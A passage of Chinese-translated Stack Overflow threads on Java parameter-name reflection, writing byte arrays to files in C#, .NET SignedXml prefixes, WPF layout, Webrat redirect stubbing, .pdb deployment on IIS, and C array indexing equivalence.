`$ java Main`
`Method: <init>`
`- Param: this`
`Method: main
- Param: args
Method: a
- Param: this
- Param: myIntParam
- Param: theString`

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2008-12-19T16:54:53.987

我可能错了......但我不认为参数名称出现在类文件中，所以我猜想没有办法通过反射来获取它们。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-30T22:33:32.873

我们为包含参数名称的 String[] 的方法创建了一个自定义注释。这种方法感觉比必须注释每个单独的参数更容易管理。我们计划添加构建时检查带注释的参数名称的数量是否与参数的数量匹配，因为这是我们需要的。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-21T19:28:27.950

当使用调试信息（通过 -g 选项）编译 java 代码时，参数的名称存在于类文件中。然后类文件包含一个 LocalVariableTable 属性（参见[http://java.sun.com/docs/books/jvms/second_edition/html/ClassFile.doc.html#5956](http://java.sun.com/docs/books/jvms/second_edition/html/ClassFile.doc.html#5956)）。这包含局部变量的名称，参数只是局部变量。这些参数对应于从索引 1（或静态方法的索引 0）开始的变量槽。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2010-09-01T18:52:19.293

如果您使用的是 Spring，那么您很幸运。只需将其添加到您的 applicationContext.xml 中：

```
<bean class="org.springframework.core.LocalVariableTableParameterNameDiscoverer"/> 
```

然后你可以在需要的地方注入这个bean：

```
@Autowired
private ParameterNameDiscoverer parameterNameDiscoverer;

Method m = ...
String[] names = parameterNameDiscoverer.getParameterNames(m); 
```

顾名思义，这个实现依赖于使用调试信息编译的类。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-12-19T17:01:39.370

@bobwienholt 是正确的 - 参数名称未编译到 java 类中，因此在运行时不可用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-21T16:30:34.267

参数名称可通过[apt](http://java.sun.com/javase/6/docs/jdk/api/apt/mirror/overview-summary.html)（现在是 javac 的一部分）获得。

# c# - 可以将 Byte[] 数组写入 C# 中的文件吗？

> ID：381508
> 
> 赞同：388
> 
> 时间：2008-12-19T16:51:59.047
> 
> 标签：c#, .net

我正在尝试将 `Byte[]`表示完整文件的数组写入文件。

来自客户端的原始文件通过 TCP 发送，然后由服务器接收。接收到的流被读取到一个字节数组中，然后发送给这个类处理。

这主要是为了保证接收`TCPClient`为下一个流做好准备，并将接收端和处理端分开。

该类`FileStream`不将字节数组作为参数或另一个 Stream 对象（它允许您向其写入字节）。

我的目标是通过与原始线程不同的线程（使用 TCPClient 的线程）完成处理。

我不知道如何实现这个，我应该尝试什么？

* * *

## 回答 #1

> 赞同：795
> 
> 时间：2008-12-19T16:58:07.740

基于问题的第一句话：*“我正在尝试将**表示完整文件**的 Byte[] 数组写入文件。”*

阻力最小的路径是：

```
File.WriteAllBytes(string path, byte[] bytes) 
```

记录在这里：

> [`System.IO.File.WriteAllBytes`- MSDN](http://msdn.microsoft.com/en-us/library/system.io.file.writeallbytes.aspx)

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2008-12-19T16:58:30.657

你可以使用一个`BinaryWriter`对象。

```
protected bool SaveData(string FileName, byte[] Data)
{
    BinaryWriter Writer = null;
    string Name = @"C:\temp\yourfile.name";

    try
    {
        // Create a new stream to write to the file
        Writer = new BinaryWriter(File.OpenWrite(Name));

        // Writer raw data                
        Writer.Write(Data);
        Writer.Flush();
        Writer.Close();
    }
    catch 
    {
        //...
        return false;
    }

    return true;
} 
```

**编辑：**糟糕，忘记了这`finally`部分......可以说它留给读者作为练习;-)

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2008-12-19T16:59:03.103

有一个静态方法`System.IO.File.WriteAllBytes`

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2008-12-19T16:58:55.367

您可以使用`System.IO.BinaryWriter`which 接受 Stream 来执行此操作：

```
var bw = new BinaryWriter(File.Open("path",FileMode.OpenOrCreate);
bw.Write(byteArray); 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2008-12-19T17:00:59.573

您可以使用[FileStream.Write(byte[] array, int offset, int count)](http://msdn.microsoft.com/en-us/library/system.io.filestream.write.aspx)方法将其写出。

如果您的数组名称是“myArray”，则代码将是。

```
myStream.Write(myArray, 0, myArray.count); 
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-12-19T16:57:53.963

是的，为什么不呢？

```
fs.Write(myByteArray, 0, myByteArray.Length); 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2018-02-25T21:36:53.733

尝试 BinaryReader：

```
/// <summary>
/// Convert the Binary AnyFile to Byte[] format
/// </summary>
/// <param name="image"></param>
/// <returns></returns>
public static byte[] ConvertANYFileToBytes(HttpPostedFileBase image)
{
    byte[] imageBytes = null;
    BinaryReader reader = new BinaryReader(image.InputStream);
    imageBytes = reader.ReadBytes((int)image.ContentLength);
    return imageBytes;
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2020-09-17T13:18:28.410

**ASP.NET (c#)**

// 这是托管应用程序的服务器路径。

```
var path = @"C:\Websites\mywebsite\profiles\"; 
```

//字节数组中的文件

```
var imageBytes = client.DownloadData(imagePath); 
```

//文件扩展名

```
var fileExtension = System.IO.Path.GetExtension(imagePath); 
```

//写入（保存）给定路径上的文件。附加员工 ID 作为文件名和文件扩展名。

```
File.WriteAllBytes(path + dataTable.Rows[0]["empid"].ToString() + fileExtension, imageBytes); 
```

**下一步：**

您可能需要为 iis 用户提供对配置文件文件夹的访问权限。

1.  右键单击配置文件文件夹
2.  转到安全选项卡
3.  点击“编辑”，
4.  完全控制“IIS_IUSRS”（如果此用户不存在，则单击“添加”并键入“IIS_IUSRS”并单击“检查名称”。

# .net - .NET 签名的 XML 前缀

> ID：381517
> 
> 赞同：11
> 
> 时间：2008-12-19T16:54:18.683
> 
> 标签：.net, xml, xml-signature

有没有办法在签名 XML 文档（.Net 中的 SignedXml 类）的签名上设置前缀？

所以而不是：

```
<Signature xmlns="http://www.w3.org/2000/09/xmldsig#>
...
</Signature> 
```

我可以有以下内容：

```
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#>
...
</ds:Signature> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-04-03T21:13:26.723

这是不可能的。如果您*在签名后*修改 XML，则可能无法验证，如上例所示。IMO 这是您必须忍受的 MSFT 数字签名实施中的一个缺陷。

很多人会说没有理由这样做，他们在技术上是正确的。但是，当您与大型供应商（即州政府或银行）打交道时，祝他们最终改变它。大多数参考实现都包含它。

更新：签名对 SignedInfo 元素中的**所有内容**进行签名，因此如果您在事后更新该元素，则签名不再有效。您已经“篡改”了消息。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-19T20:41:13.593

首先，确实没有任何充分的理由这样做。这两种形式在功能上是等效的。任何表现良好的 XML 处理器都会以完全相同的方式处理它们。因此，除非您尝试与未正确实现 XML 名称空间的应用程序对话，否则最好 (IMO) 只保留默认表单。（即使在这种情况下，如果可能的话，最好还是修复错误的应用程序。）

也就是说，您可以使用 XPath 手动设置 SignedXml.GetXml() 返回的 XmlElement 及其子元素的前缀，如下所示：

```
XmlElement signature = signedXml.GetXml();
foreach (XmlNode node in signature.SelectNodes(
    "descendant-or-self::*[namespace-uri()='http://www.w3.org/2000/09/xmldsig#']"))
{
    node.Prefix = "ds";
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-06-08T16:57:01.403

可以，但是需要修改SignedXml类，在获取SignedInfo节点的摘要值之前添加前缀。

ComputeSignature 方法将被修改以添加前缀参数

```
public void ComputeSignature(string prefix){...} 
```

当这个方法被调用时，它通过消化 SignedInfo 节点的值来计算签名值，如果你得到这个没有“ds”前缀的值然后添加前缀你会得到一个无效的签名，所以你必须添加前缀在获取 signedinfo 节点的摘要值之前。

该摘要值是在 GetC14NDigest 方法中生成的，因此该方法将被修改为添加前缀参数并在获取摘要值之前添加前缀

```
private byte[] GetC14NDigest(HashAlgorithm hash, string prefix)
{
    XmlDocument document = new XmlDocument();
    document.PreserveWhitespace = false;
    XmlElement e = this.SignedInfo.GetXml(); //get the signedinfo nodes
    document.AppendChild(document.ImportNode(e, true));        
    Transform canonicalizationMethodObject = this.SignedInfo.CanonicalizationMethodObject;       
    SetPrefix(prefix, document.DocumentElement); /*Set the prefix before getting the HASH*/
    canonicalizationMethodObject.LoadInput(document);
    return canonicalizationMethodObject.GetDigestedOutput(hash);
} 
```

好的，所以现在您有了带有“ds”前缀的 SignedInfo 节点的签名值，也就是说您仍然没有带有前缀的 xml，所以如果您只调用 GetXml 方法，您将获得没有前缀的 xml前缀，当然因为签名值是考虑到 ds 前缀计算出来的，所以你将有一个无效的签名。为避免这种情况并获得带有前缀的 xml 结构，您必须修改 GetXml 方法，添加前缀参数，然后调用 SetPrefix 方法，该方法会将“ds”前缀添加到 Signature Xml 中的所有节点

```
public XmlElement GetXml(string prefix)
{
    XmlElement e = this.GetXml();
    SetPrefix(prefix, e); //return the xml structure with the prefix
    return e;
} 
```

我将把这些修改留在这里

**定制类**

```
internal sealed class CustomSignedXml : SignedXml
{
    XmlElement obj = null;
    public CustomSignedXml (XmlDocument xml)
        : base(xml)
    {
    }

    public CustomSignedXml (XmlElement xmlElement)
        : base(xmlElement)
    {

    }

    public XmlElement GetXml(string prefix)
    {
        XmlElement e = this.GetXml();
        SetPrefix(prefix, e);
        return e;
    }

    public void ComputeSignature(string prefix)
    {
        this.BuildDigestedReferences();
        AsymmetricAlgorithm signingKey = this.SigningKey;
        if (signingKey == null)
        {
            throw new CryptographicException("Cryptography_Xml_LoadKeyFailed");
        }
        if (this.SignedInfo.SignatureMethod == null)
        {
            if (!(signingKey is DSA))
            {
                if (!(signingKey is RSA))
                {
                    throw new CryptographicException("Cryptography_Xml_CreatedKeyFailed");
                }
                if (this.SignedInfo.SignatureMethod == null)
                {
                    this.SignedInfo.SignatureMethod = "http://www.w3.org/2000/09/xmldsig#rsa-sha1";
                }
            }
            else
            {
                this.SignedInfo.SignatureMethod = "http://www.w3.org/2000/09/xmldsig#dsa-sha1";
            }
        }
        SignatureDescription description = CryptoConfig.CreateFromName(this.SignedInfo.SignatureMethod) as SignatureDescription;
        if (description == null)
        {
            throw new CryptographicException("Cryptography_Xml_SignatureDescriptionNotCreated");
        }
        HashAlgorithm hash = description.CreateDigest();
        if (hash == null)
        {
            throw new CryptographicException("Cryptography_Xml_CreateHashAlgorithmFailed");
        }
        this.GetC14NDigest(hash, prefix);
        this.m_signature.SignatureValue = description.CreateFormatter(signingKey).CreateSignature(hash);
    }         

    private byte[] GetC14NDigest(HashAlgorithm hash, string prefix)
    {

        XmlDocument document = new XmlDocument();
        document.PreserveWhitespace = false;
        XmlElement e = this.SignedInfo.GetXml();
        document.AppendChild(document.ImportNode(e, true));               

        Transform canonicalizationMethodObject = this.SignedInfo.CanonicalizationMethodObject;            
        SetPrefix(prefix, document.DocumentElement); //Set the prefix before getting the HASH
        canonicalizationMethodObject.LoadInput(document);
        return canonicalizationMethodObject.GetDigestedOutput(hash);
    }

    private void BuildDigestedReferences()
    {
        Type t = typeof(SignedXml);
        MethodInfo m = t.GetMethod("BuildDigestedReferences", BindingFlags.NonPublic | BindingFlags.Instance);
        m.Invoke(this, new object[] { });
    }

    private void SetPrefix(string prefix, XmlNode node)
    {
       foreach (XmlNode n in node.ChildNodes)
          SetPrefix(prefix, n);
       node.Prefix = prefix;
    }
} 
```

**以及使用方法**

```
CustomSignedXml signedXml = new CustomSignedXml();
.
.//your code
. 

//compute the signature with the "ds" prefix

signedXml.ComputeSignature("ds");

//get the xml of the signature with the "ds" prefix

XmlElement xmlDigitalSignature = signedXml.GetXml("ds"); 
```

# wpf - 如何将文本块设置为自动调整为 TreeView 的宽度？

> ID：381520
> 
> 赞同：10
> 
> 时间：2008-12-19T16:54:59.180
> 
> 标签：wpf, textblock, autosize

我有一个`TextBlock`我需要自动调整为 a 的宽度`TreeView`。the`TreeView`和 the`TextBlock`都包含在 a 中`StackPanel`。是在`StackPanel`一个`Expander`. 的宽度`TreeView`应该驱动其他对象的宽度，我需要改变的高度`TextBlock`来显示全文。我所有的努力都导致`TextBlock`了宽度的增加。谢谢！

```
 <Expander IsEnabled="True" HorizontalAlignment="Right" Margin="0,8,8,53" x:Name="ExpanderBookMarks" Width="Auto" Foreground="#FF625B5B" ExpandDirection="Down" IsExpanded="True" Header="Bookmarks" Visibility="Hidden">

        <StackPanel Name ="StackPanelBookmark" Orientation="Vertical" Width="{wpf:Binding Path=Width, ElementName=trvBookmarks, Mode=Default}">

            <TreeView x:Name="trvBookmarks" ItemsSource="{Binding}" 
              ItemTemplateSelector="{StaticResource BookmarkTemplateSelector}" 
              Margin="0,0,0,0" 
              TreeViewItem.Selected="HandleTreeViewItemClick" AllowDrop="True"/>

            <TextBlock x:Name="TextBlockBookmarkDiscription" TextWrapping="Wrap" Foreground="AntiqueWhite" Background="Transparent" Width="150">
                This is the discription area and needs to be very long because the end user can put 400 charectors in.                    
            </TextBlock>

        </StackPanel>

        <!--End of Dougs Treeview-->

    </Expander> 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2008-12-19T18:02:06.067

试试这个：

```
<TextBlock Width="{Binding ElementName=trvBookmarks,Path=ActualWidth}" ... /> 
```

# ruby-on-rails - 使用 Webrat 进行测试时，如何捕获到其他域的重定向？

> ID：381527
> 
> 赞同：2
> 
> 时间：2008-12-19T16:57:48.363
> 
> 标签：ruby-on-rails, ruby, testing, webrat

在我的 Rails 应用程序中，我有一个通过外部服务 Amazon FPS 重定向的表单。表单发布到我的应用程序中的一个操作，该操作重定向到亚马逊，亚马逊收集信息然后重定向回我的应用程序。

我正在用 Webrat 测试这个工作流程。显然我无法测试亚马逊，所以我想检查到亚马逊的重定向是否发生，然后模拟亚马逊重定向回我的应用程序，有效地从测试中模拟出亚马逊。

但是，当 Webrat 提交表单时，它会调用`ActionController::Integration::Session#request_via_redirect`，它会跟随所有重定向，直到它得到一个不是重定向的响应。这包括重定向到亚马逊。Rails 忽略域并从本地应用程序请求路径，但失败。

我正在寻找的是一种阻止 Webrat/Rails 在其他域上请求 URL 并允许我验证重定向的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T20:11:37.520

解决方案：我自己的方式。

```
class ActionController::Integration::Session
  # Intercepts a request to a foreign domain.  Use this to stub
  # a service which the user is bounced through, such as an
  # OpenID provider.  The block should return a new URL to
  # request.  This is the URL which the foreign service would
  # redirect the browser to if we were really using it.
  # 
  # Currently, the return URL can only be requested with a GET.
  # 
  #   stub_request 'foreign.host.com' do |path|
  #     return_from_bounce_url
  #   end
  def stub_request(host, &block)
    @request_stubs ||= {}
    @request_stubs[host] = block
  end

  def process_with_stubs(method, path, parameters = nil, headers = nil)
    @request_stubs ||= {}

    if @request_stubs.key? self.host
      url = @request_stubs[host].call(path)
      process_without_stubs(method, url, parameters, headers)
    else
      process_without_stubs(method, path, parameters, headers)
    end
  end
  alias_method_chain :process, :stubs
end 
```

# .net - 在 IIS 中部署 .PDB 文件。有什么好处吗？

> ID：381537
> 
> 赞同：25
> 
> 时间：2008-12-19T17:00:02.680
> 
> 标签：.net, asp.net, web-services, iis

我正在为**开发**服务器部署 ASP.NET 和 Web 服务解决方案到 IIS。看起来最后一个完成这项工作的人也部署了所有 .pdb 文件。我问了这个问题，并被告知如果它们留在服务器上，它们“会在日志中提供更好的堆栈跟踪信息”。

有没有道理呢？我总是将它们抛在脑后，从不将它们部署到本地机器以外的任何地方。

对于内部开发 IIS 服务器（不是生产，外界无法访问）是否有任何理由部署或不部署 .pdb 文件？有什么不好的事情会发生吗？它们真的有什么好处吗？

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2008-12-19T20:12:12.543

我一直认为 .pdb 文件仅由调试器使用。如果运行时总是检查它们的调试信息，那应该意味着抛出异常时执行速度较慢，因为它必须读取 .pdb，对吗？

所以我做了一个快速测试：

```
using System;
using System.Text;

namespace PdbSpeedTest
{
    class Program
    {
        static void Main(string[] args)
        {
            DateTime start = DateTime.Now;
            try
            {
                Program p = new Program();
                p.Looper(0);
            }
            catch (NotImplementedException e)
            {
                Console.WriteLine(e.StackTrace);
            }
            TimeSpan span = DateTime.Now - start;
            Console.WriteLine(span.TotalMilliseconds.ToString());
        }

        internal void Looper(int x)
        {
            try
            {
                if (x < 100)
                    Looper(x + 1);
                else
                    throw new NotImplementedException("blah!");
            }
            catch (NotImplementedException e)
            {
                throw new NotImplementedException("blah!", e);
            }
        }
    }
} 
```

这只是递归 100 级深度并引发异常。现在查看运行时结果：

使用同一文件夹中的 .pdb**作为**调试**版本**运行：

 **```
C:\Work\PdbSpeedTest\bin\Debug>PdbSpeedTest.exe
   at PdbSpeedTest.Program.Looper(Int32 x) in C:\Work\PdbSpeedTest\Program.cs:line 37
   at PdbSpeedTest.Program.Main(String[] args) in C:\Work\PdbSpeedTest\Program.cs:line 16
31.2504 
```

**在没有**.pdb的情况下作为**调试**版本运行：

 **```
C:\Work\PdbSpeedTest\bin\Debug>PdbSpeedTest.exe
   at PdbSpeedTest.Program.Looper(Int32 x)
   at PdbSpeedTest.Program.Main(String[] args)
15.6252 
```

**使用**.pdb作为**发布**版本运行：

 **```
C:\Work\PdbSpeedTest\bin\Release>PdbSpeedTest.exe
   at PdbSpeedTest.Program.Looper(Int32 x) in C:\Work\PdbSpeedTest\Program.cs:line 37
   at PdbSpeedTest.Program.Main(String[] args) in C:\Work\PdbSpeedTest\Program.cs:line 16
31.2504 
```

**在没有**.pdb的情况下作为**发布**版本运行：

 **```
C:\Work\PdbSpeedTest\bin\Release>PdbSpeedTest.exe
   at PdbSpeedTest.Program.Looper(Int32 x)
   at PdbSpeedTest.Program.Main(String[] args)
15.6252 
```

这些是从常规的旧命令提示符运行的，而不是在 Visual Studio 中运行的。所以 .pdb 肯定会添加堆栈跟踪信息，并减慢异常处理速度。很有意思！

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2008-12-19T17:01:07.453

如果您正在记录异常，那么部署 PDB 文件可确保异常包括行号（因此[Steven A. Lowe](https://stackoverflow.com/users/9345/steven-a-lowe)已多次通知我；））

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-12-19T17:16:17.657

如果您希望远程调试应用程序，部署 .pdb 文件会很有帮助。

[这里](http://msdn.microsoft.com/en-us/library/bt727f1t.aspx)有一篇 MSDN 文章解释了这个过程

# c - 对于数组，为什么a[5] == 5[a]？

> ID：381542
> 
> 赞同：1737
> 
> 时间：2008-12-19T17:01:33.177
> 
> 标签：c, arrays, pointers, pointer-arithmetic

[正如 Joel 在Stack Overflow 播客 #34](https://stackoverflow.blog/2008/12/18/podcast-34/)中指出的那样，在[C 编程语言](https://rads.stackoverflow.com/amzn/click/com/0131103628)（又名：K & R）中，提到了 C 中数组的这个属性：`a[5] == 5[a]`

Joel 说这是因为指针运算，但我还是不明白。**为什么`a[5] == 5[a]`**呢？

* * *

## 回答 #1

> 赞同：2049
> 
> 时间：2008-12-19T17:04:16.697

C 标准对`[]`运算符的定义如下：

`a[b] == *(a + b)`

因此`a[5]`将评估为：

```
*(a + 5) 
```

并将`5[a]`评估为：

```
*(5 + a) 
```

`a`是指向数组第一个元素的指针。`a[5]`是距离 5 个元素的值，与**相同**`a`，`*(a + 5)`从小学数学我们知道它们是相等的（加法是[可交换](https://en.wikipedia.org/wiki/commutative)的）。

* * *

## 回答 #2

> 赞同：298
> 
> 时间：2008-12-19T17:05:01.127

因为数组访问是根据指针定义的。 `a[i]`被定义为表示`*(a + i)`，它是可交换的。

* * *

## 回答 #3

> 赞同：258
> 
> 时间：2013-08-23T01:37:17.067

我认为其他答案遗漏了一些东西。

是的，`p[i]`根据定义等价于`*(p+i)`，（因为加法是可交换的）等价于`*(i+p)`，（同样，根据`[]`运算符的定义）等价于`i[p]`。

（在 中`array[i]`，数组名被隐式转换为指向数组第一个元素的指针。）

但是在这种情况下，加法的交换性并不是那么明显。

当两个操作数属于同一类型，或者甚至是提升为共同类型的不同数字类型时，交换性就非常有意义：`x + y == y + x`.

但在这种情况下，我们专门讨论指针算术，其中一个操作数是指针，另一个是整数。（整数+整数是不同的操作，指针+指针是废话。）

C 标准对`+`运算符的描述（[N1570](http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf) 6.5.6）说：

> 另外，两个操作数都应具有算术类型，或者一个操作数应是指向完整对象类型的指针，而另一个应具有整数类型。

它可以很容易地说：

> 另外，两个操作数都应具有算术类型，或者*左* 操作数应是指向完整对象类型的指针，而*右操作数* 应具有整数类型。

在这种情况下，两者`i + p`都是`i[p]`非法的。

在 C++ 术语中，我们确实有两组重载`+`运算符，可以大致描述为：

```
pointer operator+(pointer p, integer i); 
```

和

```
pointer operator+(integer i, pointer p); 
```

其中只有第一个是真正必要的。

那么为什么会这样呢？

C++ 从 C 继承了这个定义，它从 B 得到它（数组索引的交换性在 1972 年[用户对 B 的参考](https://www.bell-labs.com/usr/dmr/www/kbman.html)中明确提到），它从[BCPL](https://www.bell-labs.com/usr/dmr/www/bcpl.html)（1967 年手册）得到它，它很可能是从甚至早期的语言（CPL？Algol？）。

因此，数组索引是根据加法定义的，并且即使是指针和整数的加法也是可交换的，这种想法可以追溯到几十年前的 C 语言的祖先语言。

这些语言的类型远不如现代 C 强。特别是，指针和整数之间的区别经常被忽略。（早期的 C 程序员有时使用指针作为无符号整数，在`unsigned`关键字被添加到语言之前。）因此，由于操作数属于不同类型而使加法不可交换的想法可能不会发生在那些语言的设计者身上。如果用户想要添加两个“东西”，无论这些“东西”是整数、指针还是其他东西，语言都无法阻止它。

多年来，对该规则的任何更改都会破坏现有代码（尽管 1989 年的 ANSI C 标准可能是一个很好的机会）。

将 C 和/或 C++ 更改为需要将指针放在左侧，将整数放在右侧可能会破坏一些现有代码，但不会损失真正的表达能力。

所以现在我们有了`arr[3]`和`3[arr]`意思完全相同的东西，尽管后一种形式永远不应该出现在[IOCCC](http://ioccc.org/)之外。

* * *

## 回答 #4

> 赞同：205
> 
> 时间：2008-12-19T17:07:17.363

而且当然

```
 ("ABCD"[2] == 2["ABCD"]) && (2["ABCD"] == 'C') && ("ABCD"[2] == 'C') 
```

主要原因是在 70 年代设计 C 的时候，计算机没有太多内存（64KB 很多），所以 C 编译器没有做太多的语法检查。因此“ `X[Y]`”被相当盲目地翻译成“ `*(X+Y)`”

这也解释了“ `+=`”和“ `++`”语法。" `A = B + C`" 形式的所有内容都具有相同的编译形式。但是，如果 B 与 A 是同一个对象，则可以进行装配级优化。但是编译器不够聪明，无法识别它，所以开发人员不得不（`A += C`）。同样，如果`C`是`1`，则可以使用不同的汇编级别优化，并且开发人员必须再次使其显式，因为编译器无法识别它。（最近编译器这样做了，所以这些语法这些天在很大程度上是不必要的）

* * *

## 回答 #5

> 赞同：58
> 
> 时间：2009-02-11T15:56:20.923

关于黛娜的问题，似乎没有人提到一件事`sizeof`：

您只能将整数添加到指针，不能将两个指针相加。这样，在将指针添加到整数或将整数添加到指针时，编译器始终知道哪个位具有需要考虑的大小。

* * *

## 回答 #6

> 赞同：51
> 
> 时间：2011-08-11T13:50:22.487

从字面上回答这个问题。并非总是如此`x == x`

```
double zero = 0.0;
double a[] = { 0,0,0,0,0, zero/zero}; // NaN
cout << (a[5] == 5[a] ? "true" : "false") << endl; 
```

印刷

```
false 
```

* * *

## 回答 #7

> 赞同：32
> 
> 时间：2012-06-10T19:50:54.143

我只是发现这种丑陋的语法可能是“有用的”，或者当您想要处理引用同一数组中位置的索引数组时，至少玩起来很有趣。它可以替换嵌套的方括号，使代码更具可读性！

```
int a[] = { 2 , 3 , 3 , 2 , 4 };
int s = sizeof a / sizeof *a;  //  s == 5

for(int i = 0 ; i < s ; ++i) {  

    cout << a[a[a[i]]] << endl;
    // ... is equivalent to ...
    cout << i[a][a][a] << endl;  // but I prefer this one, it's easier to increase the level of indirection (without loop)

} 
```

当然，我很确定在实际代码中没有用例，但无论如何我发现它很有趣:)

* * *

## 回答 #8

> 赞同：28
> 
> 时间：2008-12-20T08:16:20.083

很好的问题/答案。

只是想指出 C 指针和数组是不*一样*的，尽管在这种情况下区别并不重要。

考虑以下声明：

```
int a[10];
int* p = a; 
```

在`a.out`中，符号`a`位于数组开头的地址，符号`p`位于存储指针的地址，该内存位置的指针值是数组的开头。

* * *

## 回答 #9

> 赞同：21
> 
> 时间：2012-03-23T07:05:27.817

对于 C 中的指针，我们有

```
a[5] == *(a + 5) 
```

并且

```
5[a] == *(5 + a) 
```

因此，这是真的`a[5] == 5[a].`

* * *

## 回答 #10

> 赞同：18
> 
> 时间：2011-06-19T08:37:16.313

不是答案，只是一些思考的食物。如果类具有重载的索引/下标运算符，则表达式`0[x]`将不起作用：

```
class Sub
{
public:
    int operator [](size_t nIndex)
    {
        return 0;
    }   
};

int main()
{
    Sub s;
    s[0];
    0[s]; // ERROR 
} 
```

由于我们无权访问**int**类，因此无法这样做：

```
class int
{
   int operator[](const Sub&);
}; 
```

* * *

## 回答 #11

> 赞同：14
> 
> 时间：2013-09-27T06:46:44.963

它在Ted Jensen的*A TUTORIAL ON POINTERS AND ARRAYS in C*中有很好的解释。

Ted Jensen 将其解释为：

> 事实上，这是真的，即无论写在哪里，都可以 毫无问题`a[i]`地替换它。`*(a + i)`事实上，无论哪种情况，编译器都会创建相同的代码。因此我们看到指针算法与数组索引是一样的。任何一种语法都会产生相同的结果。
> 
> 这并不是说指针和数组是一回事，它们不是。我们只是说要识别数组的给定元素，我们可以选择两种语法，一种使用数组索引，另一种使用指针算法，它们会产生相同的结果。
> 
> 现在，看看最后一个表达式，它的一部分..`(a + i)`是使用 + 运算符的简单加法，并且 C 的规则表明这样的表达式是可交换的。即 (a + i) 等同于`(i + a)`。因此我们可以`*(i + a)`像`*(a + i)`. 但`*(i + a)`可能来自`i[a]`！所有这一切都带来了一个奇怪的事实，即如果：
> 
> ```
> char a[20]; 
> ```
> 
> 写作
> 
> ```
> a[3] = 'x'; 
> ```
> 
> 和写一样
> 
> ```
> 3[a] = 'x'; 
> ```

* * *

## 回答 #12

> 赞同：9
> 
> 时间：2016-05-04T08:24:29.643

我知道这个问题已经得到解答，但我忍不住分享这个解释。

我记得编译器设计原理，假设`a`是一个`int`数组，大小`int`为 2 个字节，基地址为`a`1000。

将如何`a[5]`工作->

```
Base Address of your Array a + (5*size of(data type for array a))
i.e. 1000 + (5*2) = 1010 
```

所以，

同样当c代码分解成3地址代码时， `5[a]`会变成->

```
Base Address of your Array a + (size of(data type for array a)*5)
i.e. 1000 + (2*5) = 1010 
```

所以基本上这两个语句都指向内存中的相同位置，因此，`a[5] = 5[a]`.

这种解释也是数组中的负索引在 C 中起作用的原因。

即如果我访问`a[-5]`它会给我

```
Base Address of your Array a + (-5 * size of(data type for array a))
i.e. 1000 + (-5*2) = 990 
```

它将在位置 990 处返回我的对象​​。

* * *

## 回答 #13

> 赞同：8
> 
> 时间：2013-12-17T11:22:08.147

在 C 数组中，`arr[3]`和`3[arr]`是相同的，它们的等效指针符号是`*(arr + 3)`to `*(3 + arr)`。但反之`[arr]3`or`[3]arr`不正确，会导致语法错误，as `(arr + 3)*`and `(3 + arr)*`are not valid表达式。原因是解引用运算符应该放在表达式产生的地址之前，而不是地址之后。

* * *

## 回答 #14

> 赞同：8
> 
> 时间：2014-10-29T09:14:54.460

在 c 编译器中

```
a[i]
i[a]
*(a+i) 
```

是引用数组中元素的不同方法！（一点也不奇怪）

* * *

## 回答 #15

> 赞同：7
> 
> 时间：2019-04-08T18:45:49.487

现在有点历史了。在其他语言中，BCPL 对 C 的早期开发产生了相当大的影响。如果你在 BCPL 中声明了一个数组，如下所示：

```
let V = vec 10 
```

实际上分配了 11 个字的内存，而不是 10 个。通常 V 是第一个字，并且包含紧随其后的字的地址。因此，与 C 不同的是，命名 V 会转到该位置并获取数组中第零个元素的地址。因此 BCPL 中的数组间接，表示为

```
let J = V!5 
```

确实必须这样做`J = !(V + 5)`（使用 BCPL 语法），因为必须获取 V 才能获取数组的基地址。因此`V!5`和`5!V`是同义词。作为轶事观察，WAFL（Warwick 函数式语言）是用 BCPL 编写的，据我记忆，在访问用作数据存储的节点时，倾向于使用后一种语法而不是前者。当然，这是 35 到 40 年前的某个地方，所以我的记忆有点生疏了。:)

省略了额外的存储字并让编译器在数组命名时插入基地址的创新是后来出现的。根据 C 历史论文，这大约发生在将结构添加到 C 的时候。

请注意，`!`在 BCPL 中既是一元前缀运算符又是二元中缀运算符，在这两种情况下都执行间接操作。只是二进制形式在进行间接之前包括两个操作数的加法。鉴于 BCPL（和 B）的面向单词的性质，这实际上很有意义。当 C 获得数据类型时，“指针和整数”的限制是必要的，并`sizeof`成为一个东西。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2017-02-12T13:54:41.940

在 C 中

```
 int a[]={10,20,30,40,50};
 int *p=a;
 printf("%d\n",*p++);//output will be 10
 printf("%d\n",*a++);//will give an error 
```

指针`p`是“变量”，数组名`a`是“助记符”或“同义词”，所以`p++`有效但`a++`无效。

`a[2]`等于，`2[a]`因为这两者的内部运算都是“指针算术”，内部计算为`*(a+2)`等于`*(2+a)`

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2018-04-02T18:42:27.427

嗯，这是一个只有语言支持才能实现的功能。

编译器解释`a[i]`为`*(a+i)`并且表达式`5[a]`计算为`*(5+a)`。由于加法是可交换的，所以两者都是相等的。因此，表达式的计算结果为`true`。

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2021-08-31T09:11:15.563

因为 C 编译器总是将数组表示法转换为指针表示法。 `a[5] = *(a + 5)` 也`5[a] = *(5 + a) = *(a + 5)` 因此，两者都是平等的。

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2021-09-20T11:39:01.253

